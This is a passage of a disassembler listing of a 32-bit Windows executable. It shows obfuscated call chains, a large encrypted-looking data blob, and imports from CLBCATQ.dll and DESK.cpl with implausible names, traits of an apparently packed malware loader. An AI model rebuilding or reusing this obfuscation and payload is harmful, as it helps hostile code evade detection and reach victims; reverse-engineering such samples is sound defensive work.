sub_1001FC4	proc near		; CODE XREF: sub_1001053+12p

var_24		= dword	ptr -24h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		mov	ebx, offset dword_10A0048
		mov	[ebp+var_24], ecx
		push	ebx
		push	dword ptr [ebx+1E8h]
		push	ecx
		call	sub_10015B0
		add	esp, 8
		pop	ebx
		mov	esi, 0
		push	esi
		rep call sub_1001FF8
		mov	eax, ds:GetDC
		jmp	eax
sub_1001FC4	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001FF8	proc near		; CODE XREF: sub_1001FC4+27p
		pop	ecx
		call	ecx
		rep call sub_1002008
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_1001FF8	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1002008	proc near		; CODE XREF: sub_1001FF8+3p
		pop	ecx
		call	ecx
		add	esp, 60h
		pop	ebp
		retn	0
sub_1002008	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1002014	proc near		; CODE XREF: sub_1001A1D+10p

var_18		= dword	ptr -18h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		lea	esi, [edx+12Ch]
		sub	[ebp+var_18], 8
		push	esi
		push	ebx
		push	ecx
		push	dword ptr [esi+238h]
		call	sub_10014A8
		add	esp, 0Ch
		pop	esi
		rep call sub_1002045
		mov	eax, ds:GetTickCount
		jmp	eax
sub_1002014	endp


; =============== S U B	R O U T	I N E =======================================


sub_1002045	proc near		; CODE XREF: sub_1002014+24p
		pop	ecx
		call	ecx
		push	0
		rep call sub_1002057
		mov	eax, ds:SetFocus
		jmp	eax
sub_1002045	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1002057	proc near		; CODE XREF: sub_1002045+5p
		pop	ecx
		call	ecx
		add	esp, 24h
		pop	ebp
		retn	0
sub_1002057	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 63h dup(90h)
		dd 5809BA7Ch, 1477B865h, 0A08AF5Bh, 0F6C22269h,	0C30B8742h
		dd 0D3918C8Bh, 86D5C254h, 72222C4Dh, 8C3C8EB0h,	0D27FF87Ah
		dd 0C5C346EFh, 23D83EF6h
		db 50h,	1
word_10020F6	dw 0E250h		; DATA XREF: sub_10012CF+15o
		dd 15C616B5h, 779CF4A5h, 5207DF24h, 202769B3h, 45F00CAAh
		dd 0E185DC09h, 1DA606BFh, 72ACFCA0h, 2C9292EAh,	98E8E9F7h
		dd 0B4F7F768h, 260554A3h, 0F25E8079h, 5F5C96C2h, 520DF7A2h
		dd 0D7F954A7h, 0C0F955B0h, 2089480Fh, 0E546B8F8h, 0EDCB43Dh
		dd 6B7A52E1h, 54C2D692h, 4B8190FDh, 1C279AECh, 5A5B9EF6h
		dd 0C33395CDh, 74E5886Dh, 0B093C4D1h, 9AFC8597h, 7BEA2299h
		dd 17FB5018h, 7DD85747h, 0C5981AE5h, 5E1E0B51h,	5100FABFh
		dd 0DEA3EAA0h, 11180AAFh, 30450A7h, 7F9CDDA5h, 0CE01912Dh
		dd 98F9081Eh, 0BA2835F0h, 0C7DEE507h, 221A763Fh, 4D4FC4E0h
		dd 0B0FC5217h, 0A886D0DCh, 31F47F91h, 6010C037h, 5061A04Fh
		dd 0AF33A5D7h, 0B40E8313h, 266326C3h, 21CDC4F2h, 0C6EA6DABh
		dd 49E0C881h, 0B18EF317h, 0ABE26E8Ch, 7119C8B9h, 4EF7A8DFh
		dd 0EFC522F6h, 9F128E84h, 252B10F6h, 22430296h,	6F46831Fh
		dd 0C8DCBEA0h, 9BE4F120h, 0B01897C5h, 92480489h, 362F54BFh
		dd 4F3C61F6h, 0AF352607h, 24713C87h, 0ED2606B0h, 954508FDh
		dd 72267F4Fh, 0D20539E5h, 4E0C8364h, 51FCD28Fh,	0DECB4DC8h
		dd 25E1E47Bh, 0AF03CE47h, 0AE066067h, 9137448Ch, 38E4624Bh
		dd 0AB199765h, 2D691C71h, 0E1CE71C7h, 0A010C630h, 0B3041C72h
		dd 0B24E4DC1h, 78292BF3h, 0AE3DBB5Dh, 28387355h, 9F3CD2ABh
		dd 5BD4EE6Ah, 0C661142Ah, 2925758Fh, 0B370A690h, 8F798EE0h
		dd 39C3399Bh, 0E49EE51Ah, 8E18E572h, 0B8F38D86h, 2FDCA1B2h
		dd 0D1823B22h, 18BEE679h, 0A4D68C27h, 694B9ECh,	8C1E395h
		dd 54D81A76h, 0E19866DDh, 9BABB791h, 7CAD4843h,	0EA1AE71Ah
		dd 837C8375h, 5B32475Dh, 6928D3B7h, 0D860B624h,	14E84651h
		dd 0B616DCD7h, 0AD6D1AC4h, 92DDC89Ch, 0B7911E28h, 2E103A48h
		dd 4A140750h, 0DF33E4A8h, 923E0DABh, 0B9E151A2h, 0B304572Eh
		dd 0EE21D8F3h, 89EF378Ah, 3087643Ah, 9B0C5207h,	3E5A9ABCh
		dd 9D48B695h, 0B25C5B40h, 1D56D25Fh, 65D80A45h,	0D3A07969h
		dd 9A1A384Ah, 88F23BD5h, 0B1476719h, 7DDBA377h,	4DE87E44h
		dd 0CD8ED154h, 9F6695E1h, 5CC82ACFh, 0B06A768Fh, 921F1509h
		dd 3647C67Fh, 70322916h, 0D8A7707Bh, 0A4F2D352h, 8589CAE3h
		dd 0B27BA03Bh, 27C2D8FDh, 71141381h, 0CAF93ACCh, 9A8361BEh
		dd 27BD9FA0h, 42A04454h, 0BF9B88DEh, 0FA0A99F0h, 5A4C035Bh
		dd 0ABE65451h, 96A19C5Ah, 15729362h, 0E85289DAh, 0B7133116h
		dd 777B9BCAh, 0C557B62Ah, 2C5F24EAh, 6AD06E2Fh,	4B387F73h
		dd 0D168C046h, 984D23ECh, 27DC6E09h, 708A54A9h,	8C4626A6h
		dd 8A2F3DFDh, 3B50656Bh, 3AD7CD5Ah, 339901D6h, 671B837Fh
		dd 24F23E50h, 6EAAE559h, 48AA8D63h, 31A9C5A4h, 9504773Ah
		dd 414F8C8Eh, 0E3C20B81h, 4FD1FF28h, 82FDADD2h,	47F55917h
		dd 5D955299h, 59C957B3h, 61F54308h, 218982C0h, 20BA8EF2h
		dd 70B2B8EFh, 0B029FA88h, 0D8EA52C0h, 149AD707h, 0FA33EB7Ch
		dd 3F60A65h, 8BDAF9CDh,	159ED918h, 0FB08EBCDh, 0E47CFFE2h
		dd 15ACE0D1h, 83A77244h, 4A6F4A12h, 14BBE6DFh, 76A20CA1h
		dd 44AEE597h, 0DEC84734h, 0F283DC65h, 0DDBE11CCh, 92A0FED2h
		dd 0B6866896h, 7548CBB4h, 0FFFFCEB1h, 818018B0h, 3FBFBB8Fh
		dd 6C9EAE38h, 0C96F91AEh, 5CFC3728h, 0D94AA5BCh, 0A1FEB1E2h
		dd 0DCA4AB0Fh, 83236AFCh, 0FAE5D5DAh, 4D9089D7h, 8E439889h
		dd 39E8ECDFh, 79738990h, 53C63B37h, 0B5F2EF1Bh,	268F41C3h
		dd 72A05F1Eh, 20AFD070h, 0EFA797B0h, 2D20BE27h,	3BB30208h
		dd 1CC467BDh, 0F29DCC42h, 40E18E26h, 608F38EFh,	89E0D7D0h
		dd 0BC8F9438h, 0DBD8AA2Bh, 9393AAEEh, 70CE9ED0h, 0C898B0D8h
		dd 0D5C41BDBh, 969DF216h, 6EB97B3Ch, 0C9A342A2h, 27AED2F6h
		dd 4D6BF046h, 5B3A5D68h, 18CD633Eh, 0DCE6D9D9h,	0F10919Eh
		dd 7C6BB789h, 4D22993Ch, 1A7413A7h, 0B94F0BA1h,	2892CC6Bh
		dd 0D4B699CAh, 96A4B4C0h, 389DA8F9h, 9F79577Bh,	3E38ACB7h
		dd 64401EA7h, 9B0B4D29h, 0A7C3DEC7h, 60EEBDA7h,	5333FBEEh
		dd 0BAC805F2h, 26FCC068h, 0E181EC49h, 10CEF1EDh, 0F5238709h
		dd 7AEDC1CFh, 6671CA1Eh, 0AEC71AF1h, 0FE9BD34Ah, 0C8AA196h
		dd 3F45FBAAh, 0C92D527Bh, 9CF556C2h, 72DB53F1h,	0BF1DA660h
		dd 59D9D1C3h, 1C93171Eh, 12DAB8FAh, 3209C0Eh, 0FFEFB6B6h
		dd 992988A4h, 0BFEB3BADh, 89DB8E99h, 3C9E38B3h,	0A206E2F9h
		dd 3EB49B10h, 30310279h, 0DDB774Fh, 7AAAE5BDh, 83398D21h
		dd 9FA69A9Bh, 33CD9F33h, 0B013066h, 0AEFF67CFh,	1380B70Eh
		dd 9315A381h, 0A4A06CAh, 860F529Ah, 40147AF7h, 6080FEC4h
		dd 0D0BF815Eh, 1914FFD5h, 7348D45Bh, 8760CE28h,	3C237E61h
		dd 266F5925h, 0EDC85592h, 26C049BFh, 0D5009E81h, 16001D2Bh
		dd 237463D2h, 0E233367Bh, 8E3AC838h, 0F967A039h, 83203858h
		dd 0FF74E429h, 12FDB5Fh, 74567BB8h, 3D3B2A8Ah, 0B236DD2Bh
		dd 0AAECE769h, 1B14990Fh, 0B36007C9h, 26260385h, 0BD450A93h
		dd 0A947CB0Ah, 0AC0302D0h, 66897E97h, 0DF82C1D8h, 7BBE9F13h
		dd 0E794097Dh, 387C8688h, 14BB3B49h, 0A1FB0CC4h, 0AF2D3D4Eh
		dd 2C416DAEh, 2D4055EDh, 3FB0D462h, 61A834B7h, 153942A4h
		dd 0FAA3E21Eh, 13D25379h, 0F796D6A0h, 5B494AFh,	0FEA5B610h
		dd 3413E7F7h, 33B072FAh, 0CD552CDDh, 0A24A39C4h, 0BFDDD19Eh
		dd 8E7C1730h, 0BDC052F5h, 2D914C84h, 0A41D9434h, 0E27E7B36h
		dd 0F56E2882h, 0E63EBBF1h, 5613F3CAh, 4DB8315Ch, 0C5A65B56h
		dd 0A16D064Ch, 89C65F9Bh, 0A41A5BF5h, 2E5AD66Fh, 40D294D8h
		dd 3595B5FEh, 0E7A5B011h, 0DAE2CE3h, 62A5748Eh,	4FAD46BDh
		dd 2EA8AFF8h, 51AC1224h, 0D8A9F76Eh, 941507B2h,	0B65D7D90h
		dd 7C514137h, 0C3FBB563h, 9F832A12h, 94F2DF6h, 0D0D43A04h
		dd 0D42044A0h, 0CE3D2AB3h, 54BF3755h, 62C0EAEEh, 0C180ECD1h
		dd 5C9FA570h, 804B9A26h, 639B0789h, 3C8B1884h, 2BB88B6Bh
		dd 0D7EA3FF5h, 9893099Fh, 1A70223Bh, 8F07EFF9h,	1B79304h
		dd 0BF31FE60h, 34E9272Ch, 668C23A9h, 0A251EE2Bh, 0AFDF09F4h
		dd 7E207B05h, 41EFC387h, 0E0881E3Ch, 10BBF0E1h,	84A2078Fh
		dd 0F6AEFC38h, 9A881E7h, 6C92BF0Ch, 0F4B6FA7Eh,	26C14B08h
		dd 0A3649960h, 918FCD8Eh, 12h dup(0)
		dd 200h	dup(?)
_text		ends

; Section 2. (virtual address 00003000)
; Virtual size			: 0009D000 ( 643072.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00045C00
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 1003000h
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
CreateFileA	dd ?
; DWORD	__stdcall GetTickCount()
GetTickCount	dd ?			; DATA XREF: sub_10010E4+22r
					; sub_1001A1D+20r ...
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
LocalFree	dd ?			; DATA XREF: sub_1001148+2Cr
					; sub_1001E5C+35r
; DWORD	__stdcall GetConsoleTitleA(LPSTR lpConsoleTitle, DWORD nSize)
GetConsoleTitleA dd ?			; DATA XREF: start+Cr
; BOOL __stdcall CloseHandle(HANDLE hObject)
CloseHandle	dd ?			; DATA XREF: sub_10010C0+1Dr
					; sub_10011C8+1Dr ...
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
CreateThread	dd ?
; DWORD	__stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer)
GetCurrentDirectoryA dd	?
; int __stdcall	lstrlenA(LPCSTR	lpString)
lstrlenA	dd ?			; DATA XREF: sub_10015B0+20r starto ...
; BOOL __stdcall LocalUnlock(HLOCAL hMem)
LocalUnlock	dd ?			; DATA XREF: sub_10012CF+5Cr
					; sub_10015D7+1Br
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
UnmapViewOfFile	dd ?			; DATA XREF: sub_10013A2+Dr
					; sub_1001750+32r ...
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
HeapCreate	dd ?
; BOOL __stdcall GetComputerNameA(LPSTR	lpBuffer, LPDWORD nSize)
GetComputerNameA dd ?
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
GetSystemTime	dd ?
; BOOL __stdcall SetEvent(HANDLE hEvent)
SetEvent	dd ?			; DATA XREF: sub_1001053+28r
					; sub_1001B70+2Fr
; void __stdcall SetLastError(DWORD dwErrCode)
SetLastError	dd ?			; DATA XREF: sub_1001440+3Fr
					; sub_1001514+28r ...
; LPWSTR __stdcall GetCommandLineW()
GetCommandLineW	dd ?			; DATA XREF: sub_1001030+1Cr
					; sub_100180C+19r ...
; void __stdcall Sleep(DWORD dwMilliseconds)
Sleep		dd ?			; DATA XREF: sub_10014EE+11r
					; sub_1001584+19r
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
LoadLibraryW	dd ?			; DATA XREF: sub_1001284+37o
					; sub_1001284+44r ...
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
GetModuleHandleA dd ?			; DATA XREF: sub_100117B+4o
					; sub_1001C7D+27r
; BOOL __stdcall PulseEvent(HANDLE hEvent)
PulseEvent	dd ?			; DATA XREF: sub_10013C4+18r
					; sub_10014A8+3Fr ...
		dd 0
;
; Imports from USER32.dll
;
; BOOL __stdcall IsWindow(HWND hWnd)
IsWindow	dd ?			; DATA XREF: sub_100136C+2Fr
					; sub_10013E3+1Cr
; BOOL __stdcall CheckRadioButton(HWND hDlg, int nIDFirstButton, int nIDLastButton, int	nIDCheckButton)
CheckRadioButton dd ?
; SHORT	__stdcall GetKeyState(int nVirtKey)
GetKeyState	dd ?
; HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y,	int nWidth, int	nHeight, HWND hWndParent, HMENU	hMenu, HINSTANCE hInstance, LPVOID lpParam)
CreateWindowExA	dd ?
; BOOL __stdcall GetScrollBarInfo(HWND hwnd, LONG idObject, PSCROLLBARINFO psbi)
GetScrollBarInfo dd ?
; HWND __stdcall SetFocus(HWND hWnd)
SetFocus	dd ?			; DATA XREF: sub_1001486+Fr
					; sub_1001543+Br ...
; HDC __stdcall	GetDC(HWND hWnd)
GetDC		dd ?			; DATA XREF: sub_10011EC+26r
					; sub_1001694+35r ...
; int __stdcall	FillRect(HDC hDC, const	RECT *lprc, HBRUSH hbr)
FillRect	dd ?
; BOOL __stdcall DrawEdge(HDC hdc, LPRECT qrc, UINT edge, UINT grfFlags)
DrawEdge	dd ?
; BOOL __stdcall DrawMenuBar(HWND hWnd)
DrawMenuBar	dd ?
; LRESULT __stdcall CallWindowProcA(WNDPROC lpPrevWndFunc, HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
CallWindowProcA	dd ?
; LRESULT __stdcall DispatchMessageA(const MSG *lpMsg)
DispatchMessageA dd ?
; HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem)
GetDlgItem	dd ?
		dd 0
;
; Imports from CLBCATQ.dll
;
DowngradeAPL	dd ?
SetupOpen	dd ?
SetSetupOpen	dd ?
UpdateFromAppChange dd ?
CheckMemoryGates dd ?
		dd 0
;
; Imports from DESK.cpl
;
InstallScreenSaver dd ?
		dd 0
		dd 3110h, 2 dup(0)
		dd 32F6h, 3000h, 3164h,	2 dup(0)
		dd 33C6h, 3054h, 319Ch,	2 dup(0)
		dd 3428h, 308Ch, 31B4h,	2 dup(0)
		dd 344Ah, 30A4h, 5 dup(0)
		dd 32C6h, 31E4h, 329Ch,	3262h, 32E8h, 31BCh, 31CCh, 3242h
		dd 328Eh, 3230h, 3210h,	32D4h, 3276h, 31F4h, 3200h, 321Eh
		dd 3286h, 32A8h, 324Eh,	32B8h, 0
		dd 33A8h, 3320h, 338Eh,	3354h, 3340h, 339Ch, 3386h, 337Ah
		dd 3334h, 3312h, 33B4h,	3366h, 3304h, 0
		dd 3418h, 33D2h, 3408h,	33F2h, 33DEh, 0
		dd 3434h, 0
		db 0B7h	; ·
		align 2
aCreatethread	db 'CreateThread',0
		align 4
		db 0C0h	; À
		db 1, 47h, 65h
aTcurrentdirect	db 'tCurrentDirectoryA',0
		align 4
		dd 654701C7h, 63695474h, 756F436Bh, 746Eh, 6553045Ah, 65764574h
		dd 746Eh, 65530474h, 73614C74h,	72724574h, 726Fh, 654804F1h
		dd 72437061h, 65746165h, 1880000h, 43746547h, 616D6D6Fh
		dd 694C646Eh, 57656Eh, 6E5504D7h, 5670616Dh, 4F776569h
		dd 6C694666h, 54E0065h,	7274736Ch, 416E656Ch, 1770000h
		dd 4D746547h, 6C75646Fh, 6E614865h, 41656C64h, 1B70000h
		dd 43746547h, 6F736E6Fh, 6954656Ch, 41656C74h, 2790000h
		dd 53746547h, 65747379h, 6D69546Dh, 4B30065h, 65656C53h
		dd 34F0070h, 61636F4Ch,	6C6E556Ch, 6B636Fh, 6F4C0349h
		dd 466C6163h, 656572h, 6F4C033Dh, 694C6461h, 72617262h
		dd 5779h, 7550039Bh, 4565736Ch,	746E6576h, 8A0000h, 61657243h
		dd 69466574h, 41656Ch, 6547018Eh, 6D6F4374h, 65747570h
		dd 6D614E72h, 4165h, 6C430054h,	4865736Fh, 6C646E61h, 454B0065h
		dd 4C454E52h, 642E3233h, 6C6Ch,	6547070Ch, 676C4474h, 6D657449h
		dd 6AE0000h, 77617244h,	756E654Dh, 726142h, 68430626h
		dd 526B6365h, 6F696461h, 74747542h, 6E6Fh, 724406A8h, 64457761h
		dd 6567h
aYGetscrollbari	db 'Y',7,'GetScrollBarInfo',0
		align 4
		dd 72430652h, 65746165h, 646E6957h, 7845776Fh, 6930041h
		dd 70736944h, 68637461h, 7373654Dh, 41656761h, 6DB0000h
		dd 6C6C6946h, 74636552h, 7060000h, 44746547h, 7220043h
		dd 4B746547h, 74537965h, 657461h, 65530711h, 636F4674h
		dd 7375h, 734907C0h, 646E6957h,	776Fh, 614305FBh, 69576C6Ch
		dd 776F646Eh, 636F7250h, 53550041h, 32335245h, 6C6C642Eh
		dd 1F0000h, 75746553h, 65704F70h, 9006Eh, 63656843h, 6D654D6Bh
		dd 4779726Fh, 73657461h, 60000h
aUpdatefromappc	db 'UpdateFromAppChange',0
		db  1Dh
		align 2
aSetsetupopen	db 'SetSetupOpen',0
		align 4
		db    4
		align 2
aDowngradeapl	db 'DowngradeAPL',0
		align 4
aClbcatq_dll	db 'CLBCATQ.dll',0
		db    6
		align 2
aInstallscreens	db 'InstallScreenSaver',0
		align 2
aDesk_cpl	db 'DESK.cpl',0
		align 4
		dd 6Bh dup(0)
		dd 27280h dup(?)
_rdata		ends

; Section 3. (virtual address 000A0000)
; Virtual size			: 0000040A (   1034.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00046200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 10A0000h
		dd 12h dup(20202020h)
dword_10A0048	dd 20202020h		; DATA XREF: sub_1001FC4+8o
dword_10A004C	dd 0Ch dup(20202020h)	; DATA XREF: sub_100136C+8o
asc_10A007C	db '                                                                 '
					; DATA XREF: sub_10010C0+8o
					; sub_1001560+8o
		db '                                                                 '
		db '  e',0
		db 'f',0
aSaduDll:
		unicode	0, <sadu*dll>,0
		align 4
		dd 3 dup(0)
dword_10A0124	dd 2 dup(0)		; DATA XREF: sub_1001148+8o
dword_10A012C	dd 16h dup(0)		; DATA XREF: sub_100180C+8o
dword_10A0184	dd 19h dup(0)		; DATA XREF: sub_1001DD4+8o
dword_10A01E8	dd 17h dup(0)		; DATA XREF: sub_10013C4+8o
dword_10A0244	dd 12h dup(0)		; DATA XREF: sub_10014A8+8o
dword_10A028C	dd 0Dh dup(0)		; DATA XREF: sub_1001E5C+8o
dword_10A02C0	dd 7 dup(0)		; DATA XREF: sub_10015B0+8o
dword_10A02DC	dd 2Bh dup(0)		; DATA XREF: sub_1001514+8o
					; sub_1001750+8o
dword_10A0388	dd 0Eh dup(0)		; DATA XREF: sub_1001910+8o
dword_10A03C0	dd 90h dup(0)		; DATA XREF: sub_1001284+12o
		align 1000h
_data		ends


		end start
